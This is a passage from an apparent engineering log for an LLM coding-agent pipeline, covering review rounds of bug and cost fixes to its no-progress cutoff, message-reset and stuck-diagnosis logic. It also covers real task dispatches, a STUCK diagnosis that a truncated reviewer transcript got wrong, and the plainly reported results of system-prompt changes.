   ANY edit lands and stays true forever after -- resetting the no-progress
   counter to 0 every single turn from then on, regardless of whether the
   model does anything at all. Consequence: an attempt that edits once at
   turn 3 then does nothing for 27 turns burns all 30; a later retry
   attempt that does nothing further after an earlier attempt left the
   tree dirty also burns all 30 -- reintroducing the exact cost-bleed shape
   round 1 was written to close, for the majority of the retry budget
   (every attempt after the first genuinely-partial edit). Round 1's own
   regression test didn't catch this because it only exercised a single
   attempt with a permanently-clean tree, never a carry-over-dirty case.
   Fixed: replaced the fixed-baseline check with `repo_state_signature()`
   (HEAD + `git status --porcelain` + a capped `git diff HEAD`, hashed),
   compared TURN-TO-TURN rather than to a frozen baseline -- a real further
   edit still resets the counter, but a tree that stops changing (dirty or
   not) keeps counting toward the cutoff. Verified by directly reproducing
   the bug scenario the skeptic described (signature constant, then one
   real change, then constant forever after): the old fixed-baseline logic
   would run all 30 turns; the new logic stops 5 turns (the test's
   threshold) after the last real change, confirmed by assertion.
2. Cosmetic-only: the threshold check used `>` instead of `>=` against
   `--max-turns-without-progress`, firing after N+1 no-progress turns
   instead of the documented N. Fixed as part of the same edit (now `>=`).

Nothing else new: `--resume-patch`'s `git am` failure paths, multi-commit
patches, fcntl locking across the whole file, and the resume message's
guidance were all re-checked and hold.

**Cost track** -- one real, quantified finding; three suspects checked and
dropped:
1. A no-progress attempt's fruitless transcript was still carried forward
   into the NEXT attempt untouched (only one feedback message appended,
   same as a real RED retry) -- so the second no-progress window re-paid
   for the first one's entire dead context on top of its own. Real numbers
   from `dense-tensor-type-build`'s persisted log: attempt-1's first 12
   turns (round 1's new default cutoff) cost $0.014439; attempt-2's
   equivalent 12-turn no-progress window cost $0.049085 -- 3.4x more for
   an IDENTICAL zero-progress outcome, purely from carried context (no
   cache-discount signature visible in the real per-call cost data).
   Fixed: on the `not moved` branch specifically (zero repo changes this
   attempt -- NOT the genuine-RED branch, whose full history has real,
   proven value and is untouched), `messages[2:]` is discarded before the
   next attempt, replaced with a short "you explored without editing, try
   differently" note instead of appending on top of the dead transcript.
   `messages[0]`/`[1]` (system/task) are never touched, same invariant
   `trim_messages()` already keeps. Verified two ways: a monkeypatched unit
   test reproducing the exact scenario, and a full `main()`-level
   integration test (two consecutive no-progress attempts, retry-cap=1) --
   confirms STUCK detection still fires correctly (tail-text comparison is
   unaffected, it never depended on `messages` content) while the message
   list stays flat (length 2 at the point STUCK is written) instead of
   accumulating attempt-1's whole tool-call transcript into attempt 2.
2. Per-turn `git_head()`/`git_dirty()` calls (round 1): confirmed
   negligible -- at most ~60 extra local subprocess spawns per attempt,
   each a few ms, against a 3400s wall-clock budget and multi-second LLM
   round-trips. Dropped.
3. `--resume-from`/`--resume-patch` cost risk: already fully covered by
   the v1-rejection analysis earlier in this doc (the exact "$0.35-0.70+ if
   resumed near the size cap" risk was already computed and answered by
   making it manual-only, single-row, with the runtime cache-staleness
   warning). No new finding; a suggestion to log OpenRouter's
   cache-related usage fields per turn (not currently captured) was noted
   as a nice-to-have for a future round to settle the cache-TTL question
   with real numbers instead of a hedge -- not acted on now, out of scope
   for this round.
4. retry-cap=2 interacting with the new early-exit: checked against the
   real STUCK run's numbers, no bug found -- the early exit reaches the
   same classification point the old full-30-turn attempt eventually did,
   so STUCK still fires after exactly 2 attempts. A theoretical risk
   remains for a task needing >12 read-only turns before its first edit;
   flagged as unverified (no real data shows it happening), not acted on.

### Round 3

**Correctness track** -- three real bugs found, all in round-1/round-2's
OWN code (the review's own tightening is now finding second-order gaps in
each fix, not new gaps in the original design):
1. `main()`'s `moved = git_head() != base_head or git_dirty()` (round 1's
   original code, untouched by round 2) used the EXACT fixed-baseline
   anti-pattern round 2 had just fixed one level down for the no-progress
   counter: `base_head` was captured once before the whole retry loop, so
   `git_dirty()` goes permanently true the instant any attempt makes a real
   edit -- meaning `moved` stayed True for every LATER attempt regardless
   of whether THAT attempt did anything further. Consequence: round 2's own
   messages-reset (`del messages[2:]` on `not moved`) never fired past the
   first attempt with a real edit, silently reintroducing the exact
   cost-bleed round 2 closed, just at attempt granularity. Fixed:
   `agent_turns()` now returns `(final_text, moved)` where `moved` is a
   fresh `repo_state_signature()` comparison against THAT call's own
   starting signature, computed at every return point (not reused from the
   last per-turn check inside the loop, which lags one turn behind and
   would miss progress made on the final turn of an attempt) -- `main()`
   uses this instead of any fixed baseline. `base_head`/`git_head()`/
   `git_dirty()` are gone entirely now (no remaining callers).
2. `del messages[2:]` ran immediately upon detecting `not moved`, BEFORE
   the `write_status()` calls further down that persist the outcome (STUCK
   at not-yet-retry-capped attempts, RED at the final attempt) -- so if the
   attempt that triggers a terminal STUCK/RED outcome is ITSELF a
   zero-progress one, its own transcript was gutted to just system+task
   before being "persisted," directly defeating `write_status`'s stated
   purpose (preserving the $ already spent for a human or
   `propose_narrower_task` to inspect) on exactly the dense-tensor-type-build
   shape (zero changes in every attempt) that motivated building it. Fixed:
   the reset now happens only once the loop has decided to actually
   CONTINUE to another attempt (right before appending the next-attempt
   feedback message), never before a `write_status()` call. Verified with
   a full `main()`-level integration test: a terminal RED on a
   zero-progress final attempt now persists the real 15-message transcript,
   not a gutted 2-message stub.
3. `--resume-patch`'s teardown-adjacent finding (in `simple_dispatch.py`,
   not `agent_loop.py`): the `finally` block's first statement (`msb rm -f`
   with a 60s timeout) can itself raise `subprocess.TimeoutExpired` on a
   genuinely unresponsive sandbox -- since it's the FIRST statement in
   `finally`, an uncaught raise there skipped the two cleanup statements
   after it (`shutil.rmtree(workdir)`, `log.close()`), leaking the
   per-dispatch temp dir (the same "disk fills from worktree target dirs"
   incident class) on precisely the case the timeout exists to guard
   against. Fixed: wrapped in its own try/except, logging and continuing to
   the remaining cleanup rather than leaving it skipped.

Also fixed proactively (not a "bug" exactly, a real precision gap):
`repo_state_signature()`'s diff was capped at 50K chars before hashing,
which could make two genuinely different large diffs sharing an identical
first 50KB hash identically and be misclassified as "no progress."
Confirmed this signature never leaves the process (nothing here is sent to
OpenRouter or appended to `messages`), so there was no cost reason for the
cap in the first place -- removed it; hashing a full diff locally is
millisecond-cheap regardless of size.

**Cost track**: nothing new found. Checked and dropped: per-turn
`repo_state_signature()` cost (confirmed zero -- local git calls only,
never reaches the model); whether a partial-progress multi-attempt RED
still carries a growing transcript unbounded until the 200K-char trim
(real, but no real log yet exists that hits it -- the existing trim already
bounds the worst case, flagged as "watch for it" rather than built
speculatively); the `--max-turns-without-progress`/`--max-turns`
interaction for a genuinely-succeeding task (confirmed sound -- the
condition only fires on zero repo change, so it cannot pressure a
progressing attempt). Explicit verdict from this round: two rounds of real
fixes have captured the realistic waste; nothing rose to a fix-now finding.

### Round 4

Explicitly asked to hunt for a THIRD occurrence of the "capture once,
compare forever" fixed-baseline pattern that rounds 2 and 3 each found one
level further up the call stack. None found -- `initial_sig`/`moved()` in
`agent_turns()` and the `moved` plumbing in `main()` are both correctly
attempt-scoped now, confirmed by re-tracing every `write_status(...,
messages)` call site (FATAL, TIMEOUT via both paths, STUCK, RED). That
absence is itself the round's first real result: the pattern has been
fully hunted down, not just fixed once and assumed gone.

**Correctness track** -- two new, different-in-kind bugs, both real:
1. The relocated `del messages[2:]` (round 3) reset to a FIXED index
   regardless of how many attempts' worth of real history sat there. A
   `not moved` attempt's premise -- "this attempt's transcript proved zero
   value" -- only covers what THAT attempt itself added, not any earlier
   attempt's genuinely productive work. Concrete failure: attempt 1 makes a
   real edit (`moved=True`, RED, correctly kept); attempt 2 builds on it
   but adds nothing further of its own (`moved=False` relative to attempt
   2's OWN start, per round 3's correct per-attempt scoping); resetting to
   a fixed `messages[2:]` wiped out attempt 1's entire real transcript too
   -- the very reasoning behind an edit already sitting, uncommitted, in
   the repo -- leaving attempt 3 with no memory it exists and (unlike
   `--resume-from`) no "check git state first" instruction to compensate.
   This is exactly the STUCK-run failure shape (a partial success followed
   by stalling) that motivated the reset in the first place. Fixed:
   `attempt_start_len = len(messages)` is captured at the top of each
   retry-loop iteration; the reset is now `del messages[attempt_start_len:]`
   -- symmetric with `moved`'s own per-attempt scoping, discarding only
   what THIS attempt added. Verified by direct reproduction: attempt 1's
   real 4-message transcript (2 turns of tool calls) now survives attempt
   2's no-progress reset, confirmed present (8 total messages, including
   attempt 1's real turns) right before attempt 3 starts.
2. `normalize_for_stuck_check()` unconditionally dropped `all_lines[0]`
   (justified for the common case: a truncation fragment from verify()'s
   fixed-size tail slice) -- but a genuinely SINGLE-LINE tail (an early
   build/config error, a shell syntax error in `--verify-cmd`, any crash
   before real test output starts, or the literal
   `"(no changes, no verify run)"` placeholder) has no fragment to drop;
   `all_lines[1:]` on a one-line input is simply `[]`, so every single-line
   tail normalized to the same empty string regardless of actual content --
   confirmed directly (`"failure A"` and `"failure B"` both normalize to
   `""`). Consequence: two attempts with completely unrelated one-line
   failures would misclassify as STUCK on a false match. Fixed: only drop
   the first line when a second one exists to fall back on (`all_lines[1:]
   if len(all_lines) > 1 else all_lines`). Verified: two different
   single-line failures now normalize differently; the existing multi-line
   truncation-fragment-dropping behavior is unchanged (confirmed with a
   same-body-different-garbage-first-line pair still normalizing equal).

Also folded in a trivial code-quality nit the cost-maniac pass flagged
(not a cost issue -- confirmed negligible either way, but free to fix):
two of `agent_turns()`'s three non-fallthrough return points were calling
the `moved()` closure (a fresh `repo_state_signature()` call) when the
turn's already-computed `sig` was still accurate (nothing between
computing it and returning touches the filesystem) -- now reuses `sig`
directly at those two sites; the actual fallthrough return (where the
final turn's tool calls could have changed the repo since `sig` was last
computed) still uses `moved()`.

**Cost track**: convergence confirmed a second time. No new dollar-cost
waste found; round 3's correctness changes (`repo_state_signature`,
`moved`, the verify() skip on `not moved`) are all local/free, re-verified
against real diff sizes in this repo (492B-9.7KB) and real `git diff`
timing (2ms). The one nit above was noted as code-quality, not cost.

### Round 5 (final)

**Cost track**: explicit convergence verdict, no new findings -- a third
round in a row. Specifically re-checked whether round 4's
`attempt_start_len` watermark (preserving an earlier attempt's real
transcript instead of always resetting to a fixed index) could reintroduce
the original carry-forward cost bug across a longer chain of
edit/stall/reset attempts: structurally bounded by `--retry-cap` (default
2 -> max 3 attempts total, at most 2 attempt transitions), independently
bounded again by the 200K-char `trim_messages()` regardless of attempt
boundaries. A fresh pass over the rest of the pipeline (not just the
no-progress/reset mechanism rounds 1-4 focused on) found no redundant
OpenRouter calls and confirmed `--max-tokens`/`MAX_CONVERSATION_CHARS`/
`MAX_TOOL_OUTPUT`/`propose_narrower_task`'s summary cap are all still
in-tune against real logs.

**Correctness track**: asked explicitly for a genuine convergence verdict
rather than a forced fifth finding -- two more real bugs turned up anyway,
both second-order bugs in round 4's own fixes:
1. Round 4's `attempt_start_len` was a captured absolute index -- but
   `trim_messages()` runs every turn and can delete whole turns starting
   at index 2 mid-attempt (if a single attempt's own tool output pushes
   past `MAX_CONVERSATION_CHARS`), shifting every later index down without
   `attempt_start_len` ever being adjusted. Reproduced directly: a 40-turn
   attempt-2 with large tool output forces repeated trims; the later
   `del messages[attempt_start_len:]` would then cut mid-turn, leaving an
   assistant `tool_calls` message with no matching `tool` reply --
   OpenRouter rejects that on the next call, corrupting every remaining
   attempt with an unrelated, spurious failure. Also reachable on attempt 1
   of a `--resume-from` run, whose loaded history can already be large
   before the marker is even captured. Fixed: the marker is now the actual
   last message OBJECT at attempt-start (`attempt_start_marker = messages[-1]`),
   looked up by IDENTITY (`is`) at reset time rather than by a stored
   index -- an object reference survives being shifted, and
   `trim_messages()` only ever removes WHOLE turns, so any surviving
   message is always still a valid turn boundary to cut after. If the
   marker itself was trimmed away (only possible if this attempt's own
   growth was extreme enough to out-trim its own starting point -- rare
   given `--max-turns-without-progress` should end a truly unproductive
   attempt long before that much output accumulates), the reset is skipped
   entirely rather than guessing at an unsafe boundary: carrying the
   already trim-bounded history forward is safe, corrupting it is not.
   Verified by reproducing the exact corruption scenario (40-turn
   large-output attempt-2, trims firing repeatedly mid-attempt) and
   confirming zero orphaned `tool_calls` messages after the reset, where
   the old index-based version would have produced one.
2. `normalize_for_stuck_check()`'s `_NOISE_LINE_RE` PASS-line filter still
   ran on the single-line fallback body round 4 introduced -- a
   single-line SUMMARY that happens to start with "PASS" (e.g.
   `"PASS: 5 FAIL: 2"`) matches the same per-test-PASS-line pattern and
   gets filtered to nothing, so two different such summaries
   (`"PASS: 5 FAIL: 2"` vs `"PASS: 3 FAIL: 9"`) both normalized to `""`
   and compared equal -- same false-STUCK-match failure mode round 4
   fixed, one case narrower. Fixed: never let filtering erase ALL the
   signal -- fall back to the unfiltered body when the filtered result is
   empty but the input wasn't. Verified: the two example summaries now
   normalize differently; identical single-line tails still compare equal
   (no regression).

**Overall verdict after 5 rounds**: genuine convergence was NOT reached in
the sense of "a round found nothing" on the correctness track -- every
round found at least one real, reproduced bug, several of them in the
immediately preceding round's own fix (rounds 2, 3, and 5 each found a
bug specifically in the mechanism the previous round(s) had just changed).
The cost track, by contrast, converged clearly and stayed converged for
three straight rounds (3, 4, 5) after its one real finding in round 1-2.
This asymmetry is itself informative: the no-progress/reset mechanism
turned out to have more interacting edge cases (attempt boundaries, turn
boundaries, message-list identity, trim timing) than its cost profile did,
and each fix round's own review is what surfaced the next layer -- exactly
the value this adversarial process is for. No further rounds were run
beyond the 5 requested; if the mechanism is touched again, a follow-up
round specifically re-attacking `attempt_start_marker`/`trim_messages`
interaction would be the highest-value next check, not a blanket re-review.

## Fourth review cycle: 3 more rounds, testing whether the design has
## actually stabilized after the 5-round series above

Requested explicitly to check how well the 5-round series held up, with
round 1 specifically re-attacking `attempt_start_marker`/`trim_messages`
(the exact thing round 5 flagged as the highest-value next check) plus a
genuinely fresh full-file pass on both tracks.

### Round 1

**Correctness track**: the specific `attempt_start_marker`-across-a-
resume-boundary hypothesis (does `--resume-from`'s `json.load` mint a new,
`==`-but-not-`is` duplicate that could break identity lookup) was checked
and found FALSE -- traced the exact lifecycle: the marker is always set to
a message object created live by THIS process after the resume load, never
to one of the deserialized objects themselves, so there's no second
JSON round-trip to break identity against. One new real finding instead:
`repo_state_signature()`'s three `subprocess.run(..., timeout=30)` calls
(called up to ~90 times per run: 30 turns x 3 attempts) were never wrapped
in any try/except, anywhere up the call chain -- confirmed with a direct
repro that an uncaught `subprocess.TimeoutExpired` from an unguarded
caller propagates straight through and crashes the process. `main()`'s
only exception guard around the retry loop is `except OutOfTime`; a
crash here means `write_status()` never runs, and `simple_dispatch.py`'s
fallback classifier (which only recognizes `RC=124/137/143` as TIMEOUT)
would misclassify this as a plain, unexplained RED -- exactly the failure
class this whole rewrite exists to eliminate, just relocated to a spot
the existing `verify()`-timeout handling doesn't cover. A real trigger is
plausible given the model's unrestricted `run_bash`: `.git/index.lock`
contention, a backgrounded `git gc`, or a huge generated/binary file
slowing `git diff HEAD`. Fixed: added `safe_repo_state_signature()`
(catches `subprocess.SubprocessError`/`OSError`, returns `None` instead of
raising) and `_sig_changed(a, b)` (treats either side being `None` as
"changed" -- fails toward assuming progress happened, since that's the
safer wrong guess: worst case is one skipped optimization, never a wrong
STUCK/no-progress classification or a wrongly-discarded real transcript).
Every `agent_turns()` call site now goes through these instead of the raw
functions. Verified: a monkeypatched `repo_state_signature()` that always
raises `TimeoutExpired` no longer crashes `agent_turns()` -- it completes
normally, logs a warning each time, and correctly defaults `moved=True`.

**Cost track**: no new mechanism-level waste (re-confirmed rounds 3-5's
convergence: exactly one signature computation per turn plus one at
attempt-start, `trim_messages()`'s per-turn `json.dumps` length check is
CPU not $, `simple_dispatch.py`'s cost surface unchanged). One real,
partially-open finding: real per-turn numbers from
`dense-tensor-type-build-71c68601-full-agent.log` show $/1k-tokens
swinging ~4x turn-to-turn (turn 27: $0.0383/1k at 49,263 tokens; turn 29:
$0.1404/1k at 48,371 tokens, a *smaller* completion) with no
prompt/completion-count explanation -- but the code never captured
anything beyond `cost`/`prompt_tokens`/`completion_tokens` from `usage`,
so there's no way to tell whether this is provider-routing variance or
unlogged cache/reasoning-token billing from the existing data. Proposed
pinning `provider: {sort: price}` was NOT applied -- that's an
unverified guess at the cause, and forcing routing changes behavior
(potentially trading cost for reliability/speed) on a hypothesis, not a
confirmed diagnosis, which this project's whole standard explicitly rejects.
Applied instead: every turn now also logs the FULL `usage` dict to stderr
(captured in the existing full-agent.log pull, zero added cost -- it's a
print, not an extra call), specifically so a future round has the actual
cache/reasoning-token fields to diagnose this with real data instead of
guessing. The `provider` question stays open until a fresh dispatch
produces that data.

### Round 2

**Correctness track** -- two real bugs, both confirmed by direct
reproduction. The user then redirected from "3 more review rounds" to
"actually dispatch 3 real tasks" -- these two were fixed anyway before
dispatching, since real money was about to run through this exact code:
1. The round-1 fix's own tie-break has a real, reproduced cost: `_sig_changed`
   fails toward "changed" whenever either signature is `None`, which is
   correct for a single transient git hiccup but wrong for SUSTAINED
   failure -- if `safe_repo_state_signature()` returns `None` every turn
   (corrupted `.git`, disk full so every git call ENOSPCs, a model-induced
   `.git/index.lock` that never clears), `_sig_changed(None, None)` is
   `True` every turn, `no_progress_turns` resets to 0 forever, and the
   no-progress cutoff can never fire -- silently reintroducing the exact
   "explore forever, burn the whole budget, never detected" shape the
   cutoff exists to close, just triggered by broken git instead of literal
   zero-progress. Reproduced directly: 20 turns of an always-raising
   `repo_state_signature()` ran all 20 turns instead of stopping at
   `max_turns_without_progress=3`. Fixed: a separate `sig_failures`
   counter tracks CONSECUTIVE signature failures (independent of the
   no-progress counter, which still gets the safe "assume changed"
   treatment for an occasional hiccup); once it reaches
   `max_turns_without_progress`, the attempt ends early with `moved=True`
   (can't know either way, so default to not discarding anything).
   Verified: the same always-raising monkeypatch now stops after 2 calls
   instead of running all 20.
2. `call_openrouter` had two more response-handling gaps in the same class
   already fixed for HTTPError/empty-choices: `json.loads(text)` sat
   OUTSIDE every try/except, so a 200 response with a non-JSON body (an
   HTML error page from a proxy/CDN in front of OpenRouter, a truncated
   stream) raised an uncaught `JSONDecodeError`; and `resp.read()` can
   raise `http.client.IncompleteRead` on a connection dropped mid-body,
   which is NOT a subclass of `OSError`/`URLError`/`TimeoutError` and so
   wasn't caught by the existing clause either. Both crashed the process
   before `write_status()` ran, same failure class as everything else
   fixed in this mechanism. Fixed: both now raise `RuntimeError`, same
   treatment as every other OpenRouter-response failure mode. Verified
   with direct mocked-response tests for both cases.

**Cost track**: converged a second time in this series (5 straight
converged rounds counting the prior series' last 3). Confirmed the
`safe_repo_state_signature`/`_sig_changed` mechanism's worst case (before
the fix above) was bounded by pre-existing `--max-turns`/`--retry-cap`
caps, not a new unbounded cost class -- same order of magnitude as the
original STUCK run this whole mechanism was built to cap. Confirmed the
new per-turn `usage` dict logging is genuinely free (stderr print, never
appended to `messages`, doesn't disturb tail-based status classification).
No new dollar-cost waste found in a fresh full-file pass.

Only 2 of the planned 3 rounds ran in this series -- the user redirected
mid-round-2 wrap-up to actually dispatching real tasks through the
pipeline instead of continuing pure review. No round 3.

## First real production dispatch after the full review series (2026-09-11)

Dispatched 3 real board rows in parallel: `http-query-sugar-build`,
`dense-tensor-type-build`, `toylang-conf-yaml-build`. All 3 came back
STUCK. Investigated each via its persisted `-messages.json` transcript
rather than accepting the outcome at face value:
- `http-query-sugar-build`: genuinely wide-reaching exploration across a
  7-backend compiler (Builtin enum, tags, per-backend emitters,
  backend-restriction patterns) with no edit attempted in either attempt.
  Consistent with this row's OWN prior history -- 3 earlier attempts under
  the OLD opencode-based pipeline also made zero changes, leading to the
  maintainer's original "hand off to a privileged session" ruling. The new
  pipeline did not change this outcome; the row's own diagnosis (a real
  capability gap for this model tier on a multi-backend builtin this size,
  not an infra/pipeline bug) held up under a second, independent pipeline.
- `dense-tensor-type-build`: consistent with its already-documented STUCK
  history from earlier in this project. Also surfaced a real bug:
  `propose_narrower_task`'s recovery call itself crashed
  (`'NoneType' object has no attribute 'strip'`) -- caught safely by the
  function's own broad `except Exception`, so it didn't affect the
  dispatch's real outcome, but produced an unhelpful, uninformative error
  message instead of a real diagnosis. Root cause: `message.content` can
  be a literal JSON `null` on a reasoning-heavy response that spends its
  whole `max_tokens` budget on reasoning before emitting visible text --
  confirmed real by this same dispatch's own turn logs showing
  reasoning_tokens over 2500 on some real build turns. Fixed:
  `.get("content") or ""` instead of `["content"].strip()`, and bumped
  this call's `max_tokens` 1024 -> 2048 (this call's real cost is
  ~$0.0001, so there's no reason to keep it tight) to reduce how often
  reasoning alone exhausts the budget.
- `toylang-conf-yaml-build`: the most notable result -- this exact row
  succeeded with a real, GREEN patch earlier in this project (run
  `63c69b3e`, before the whole review series began). This re-run spent
  both attempts investigating the test harness (CARGO_BIN_EXE, nextest
  config, how tests locate `toylang.conf.yaml`) rather than making the
  actual wiring edit, and was cut off by the no-progress cutoff at turn 12
  each time -- by turn 11 it had reached `grep -rn "\.emit(" src`, close to
  (but not at) the real edit site. Plausible causes, not conclusively
  distinguished: ordinary model sampling variance sending it down a
  different, less direct exploration path this time, or the no-progress
  cutoff firing slightly too early for a genuinely-progressing-but-slow
  research phase on this particular task. Left as an open question rather
  than guessed at -- worth watching if a similar "very close to editing
  when cut off" shape recurs on a future dispatch.

All 3 outcomes were real, cheap failures ($0.0176 + $0.0169 + $0.0318 =
$0.0663 total for all three) rather than expensive ones -- direct evidence
the cost fixes work as designed: the OLD pre-fix cost profile for a
STUCK run was $0.174 for ONE task; this dispatch got 3 real STUCK
classifications, each investigated via its real transcript rather than
assumed, for well under half that combined.

## Resuming toylang-conf-yaml-build: what "not self-resolving" actually meant

Per this project's own STUCK-recovery design, resumed
`toylang-conf-yaml-build` from its persisted session with a directive
nudge ("stop exploring, you already found everything, write the edits
now") -- exactly the manual-only mechanism this whole feature exists for.
Result: STUCK again ($0.0873), but investigating the real transcript this
time (not accepting the classification) found something categorically
different from the first two dispatches. THE TASK WAS ACTUALLY COMPLETED:
a real, correct, complete patch exists (`Config.target` field with a Node
default, all three JS emission call sites wired through `Config::load()`/
`emit_with`, a real `tests/backend_js.rs` proving `target: web` changes
emission). Verified directly against the patch content -- not inferred
from a status flag.

**Why it still reported STUCK -- two compounding, now-fixed bugs:**

1. `repo_state_signature()`'s progress detection (`git status --porcelain`
   + `git diff HEAD`) is structurally blind to gitignored paths. The
   model's remaining real work after the code fix was installing a
   working `tsc` into `site/node_modules` (gitignored, confirmed via
   `git check-ignore`) to satisfy a pre-existing sandbox environment gap
   (`tsc` missing, unrelated to the model's actual change -- the same
   failure the earlier, separately-run successful dispatch of this row
   also hit and separately fixed). That real, necessary work was
   completely invisible to the no-progress counter -- git saw nothing
   change turn over turn -- so `--max-turns-without-progress` correctly
   detected "no TRACKED file changes" but incorrectly implied "no
   progress at all," and cut the attempt off mid-repair. Not fixed in
   this round (see below for why).
2. Independently, `propose_narrower_task`'s own diagnosis was WRONG:
   `messages_summary = json.dumps(messages)[:60_000]` truncates from the
   FRONT. This run's full transcript was 197,515 chars -- the 60K-char
   prefix captured only the first 20 of 90 messages, pure early
   exploration before the real edit ever happened. The reviewer
   confidently reported "never made a single repo change," which is
   factually false, verified against the real patch. Fixed: slice the
   LAST 60K chars instead (`[-60_000:]`) -- recency, not the original
   task restated (already passed separately), is what's diagnostic for
   "why did THIS attempt end where it did." Re-ran the reviewer against
   this EXACT real transcript with the fix applied: it now correctly
   reports the task is complete and the blocker was environmental, not
   scope -- verified with a real OpenRouter call, not just structurally.

**Bug 1 (progress detection blind to gitignored paths) was deliberately
NOT fixed in this round.** It's real, but the fix isn't obviously safe:
naively counting activity as "progress" whenever ANY tool call succeeds
(regardless of git-visible effect) would reopen exactly the cost blowup
`--max-turns-without-progress` was built to close -- a model doing 12
turns of pure exploration (the http-query-sugar-build/dense-tensor-
type-build shape, confirmed real and current this same dispatch) would
look identical to a model doing 12 turns of genuine gitignored-directory
repair. Distinguishing them needs a more careful design (e.g. tracking
whether `verify()`-adjacent commands succeed, or giving dependency-install
commands a separate, smaller allowance) than a quick patch -- flagged as
a real, specific follow-up, not built speculatively.

**Closed the loop**: applied the real patch to a clean worktree with a
real `tsc` present and ran `just check` -- 436/436 tests pass, 2 skipped.
The patch was landed (commit `be37552`, with provenance lines per
AGENTS.md's Committing section: derived work is the wiring plan already
named in the brief, agent-invented is the config field's exact shape and
test cases; generated by `deepseek/deepseek-v4-flash-0731` via this
pipeline, verified locally before landing since the sandbox's own `tsc`
gap is a known, separate issue -- see below).

## Making "why it got stuck" trustworthy, not assumed (requested follow-up)

The toylang-conf-yaml-build investigation above found the reviewer's own
diagnosis was WRONG (truncation direction), and that wrongness was only
caught because a human happened to manually re-verify a STUCK
classification instead of trusting it. Explicitly asked to make sure this
class of problem (a stuck run's real cause going unfound because nobody
gets the ACTUAL answer the agent already has) can't recur silently.

**Ground the reviewer in facts it can't misread, not just a better
transcript window.** Fixing the truncation direction reduces how often
the reviewer's transcript view is misleading, but any fixed-size window
can still miss the relevant part of an arbitrarily long conversation.
Added `_patch_ground_truth()`: a fact computed directly from the actual
extracted patch (file/line counts, or "no patch was extracted") that
does NOT depend on the conversation window at all, injected into the
reviewer's prompt as "CONFIRMED GROUND TRUTH ... trust this over your own
read of the transcript if they disagree." Verified this actually changes
the model's behavior, not just its prompt: fed the reviewer the OLD
misleading window (the exact first-20-of-90-messages slice that produced
the wrong original verdict) alongside the real patch fact, and its own
visible reasoning trace explicitly worked through the contradiction
("ground truth says a patch exists... but transcript shows no edits...
need reconcile") instead of confidently repeating the wrong claim.

**Defense in depth: a deterministic (non-LLM) contradiction check on top.**
Prompt injection reduces how often the model ignores a given fact, it
doesn't guarantee it -- confirmed live in the same adversarial test: the
model still occasionally concluded "the agent never actually performed
the edits" even after being shown the ground truth, just reaching the
right overall `narrowable: false` verdict by a wrong path. Added
`_NO_EDITS_CLAIM_RE`, checked against the reviewer's own `reasoning` text
whenever a real patch exists: if a "no edits were made"-shaped claim is
found alongside a confirmed real patch, the proposal gets an explicit
`ground_truth_contradiction` field, and the printed terminal SUMMARY line
(not just the JSON file) gets a `!! CONTRADICTS KNOWN FACTS, DO NOT TRUST
!!` suffix -- impossible to miss the way the original wrong verdict was.
Verified this fires on the exact adversarial reasoning text that produced
it.

**A real, separate bug surfaced while building this**: the ground-truth
injection makes the model reason MORE when the transcript and the fact
genuinely conflict (the correct effect), which pushed it past
`max_tokens=2048` on reasoning alone (`finish_reason: "length"`,
`content: null`) before it could ever emit the JSON answer. Raising to
4096 didn't fully close this -- confirmed live, still occasionally hit
the same failure at 4096. `reasoning: {"effort": "low"}` (an OpenRouter
request parameter, not previously used here) reliably fixed it:
`finish_reason` went from `"length"` to `"stop"`, reasoning tokens
dropped from unbounded to ~1500, and valid JSON was returned every time
in repeated testing -- without visibly degrading answer quality on the
real correct-transcript case (re-verified: the detailed, accurate,
ground-truth-reconciled answer for the real toylang-conf-yaml-build
transcript is unchanged in substance with low reasoning effort).

## Worker system prompt: minimal, evidence-based additions

Also requested: prompt the BUILD-LOOP model itself better, at the system
prompt level, kept small (this text is re-sent every single turn, so size
has a real recurring cost) -- not a general "be a good coding agent"
essay, specifically targeting the failure shapes this session's real
dispatches actually showed:

1. **Sequential exploration with no self-imposed stopping point.**
   `http-query-sugar-build`'s and `dense-tensor-type-build`'s real
   reasoning traces showed a strict "let me look at X, then let me look
   at Y" chain for the ENTIRE turn budget of both attempts, with the SAME
   next-step ("check how the parser handles `tensor(n;m)`'s semicolon")
   restated three times in a row without ever being completed or acted
   on -- never a turn where the model decided it knew enough to write.
2. **Flailing through alternatives instead of trying the standard fix
   once.** Fixing a missing `tsc` involved trying `pnpm install`, then
   `npm install` (rejected: "configured to use pnpm"), then probing for
   `corepack`/`node` paths by hand, then a `/tmp` install, then finally a
   direct `npm-cli.js install` in `site/` -- 5 different approaches
   across ~15 turns before landing on what worked (plain `npm install`
   with an explicit path, tried third).
3. **A hallucinated tool name** (`bash` instead of `run_bash`) wasted one
   full turn in the same real transcript.

Added to `SYSTEM_PROMPT` (agent_loop.py): tool names stated as exact (no
other names accepted); "once you've located the specific lines to change,
make the edit" instead of continuing to read more "just in case";
encouragement to batch multiple independent tool calls into one turn
instead of one-per-turn; "try the single most standard install command
... once" instead of probing alternatives in sequence. Kept to ~1400
chars (~350 tokens) total including the pre-existing text -- negligible
against the 20-40K-token contexts these real runs already reach.

**Validated with a real dispatch, not just trusted as a hopeful prompt
edit**: redispatched `dense-tensor-type-build` under the new prompt --
this exact row already has two real STUCK data points under the OLD
prompt (the original validation run and this review series' batch
dispatch), giving a genuine same-task before/after comparison rather than
a one-off anecdote.

**Honest result: still STUCK ($0.0114), and the specific behaviors
targeted did not visibly change.** The new transcript (run `78353c1b`)
shows the exact same pattern as before the prompt change: 11 turns, every
single one a lone tool call (no batching -- `tool_calls per turn: [1, 1,
1, 1, 1, 1, 1, 1, 1, 1, 1]`), zero `write_file` calls, cut off by the
no-progress cutoff same as always. The prompt guidance did not make this
particular hard, wide-reaching task (the same `tensor(n; m)` two-arg
call-form complexity documented above) converge. Reporting this plainly
rather than as a success: a ~1400-char prompt addition is not shown to
fix a genuine multi-file design-complexity wall on this model tier for
this specific task shape. It may still help the narrower failure modes it
targeted (the tool-name hallucination, flailing through install
alternatives) in cases where those specific behaviors would otherwise
occur -- this run's transcript simply didn't include either behavior to
test against. No conclusion drawn beyond what was actually observed.

**What DID work, and is the more direct answer to "ship a smaller
version"**: the reviewer's own recovery proposal for this exact STUCK run
correctly diagnosed the real blocker (the `tensor(n; m)` two-argument
call form doesn't fit the existing unary-`Builtin` pattern, unlike
`transpose`) and proposed a genuinely achievable narrower slice --
`transpose` alone, deferring `tensor` construction. No
`ground_truth_contradiction` was raised (correct: there truly is no
patch here, confirming the grounding fix doesn't cry wolf on a genuine
no-edit case either). Dispatched this narrower task for real
(`dense-tensor-transpose-only`) to test whether "ship a smaller version"
